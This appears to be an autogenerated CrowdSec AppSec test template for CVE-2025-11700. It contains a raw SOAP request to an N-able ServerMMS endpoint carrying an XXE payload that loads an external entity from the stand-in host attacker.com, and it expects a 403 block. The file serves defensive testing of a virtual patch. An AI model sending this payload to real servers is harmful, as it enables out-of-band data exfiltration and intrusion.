.appsec-tests/vpatch-CVE-2025-11700/CVE-2025-11700.yaml

## autogenerated on 2025-12-17 15:05:33
id: CVE-2025-11700
info:
  name: CVE-2025-11700
  author: crowdsec
  severity: info
  description: CVE-2025-11700 testing
  tags: appsec-testing
http:
  - raw:
      - |
        POST /dms/services/ServerMMS HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: ""
        Content-Type: text/xml; charset=utf-8

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE servicetemplate [
        <!ENTITY % xxe SYSTEM "http://attacker.com/evil">
        %xxe;
        ]>
        <soapenv:Envelope
            xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
            xmlns:xsd="http://www.w3.org/2001/XMLSchema"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <soapenv:Header/>
          <soapenv:Body>
            <ns1:applianceLogSubmit xmlns:ns1="http://www.n-able.com/mickey">
              <sessionID>1</sessionID>
              <logType>NETWORK_CHECK_LOG</logType>
              <contents>test</contents>
            </ns1:applianceLogSubmit>
          </soapenv:Body>
        </soapenv:Envelope>
    cookie-reuse: true
    matchers:
    - type: status
      status:
       - 403
